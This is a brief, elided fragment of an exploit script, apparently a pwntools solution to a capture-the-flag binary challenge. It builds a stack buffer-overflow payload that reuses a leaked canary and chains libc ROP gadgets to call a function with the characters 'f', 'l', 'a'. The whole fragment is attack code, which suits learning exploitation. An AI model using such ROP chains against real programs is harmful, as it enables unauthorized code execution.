...
addr3 = p64((rop_libc.find_gadget(['pop rdx', 'ret']))[0])  
...
payload = b'A'*10+canary+b'A'*8+addr1+p64(ord('f'))+addr2+p64(ord('l'))+addr3+p64(ord('a'))+p64(base+0x1249)
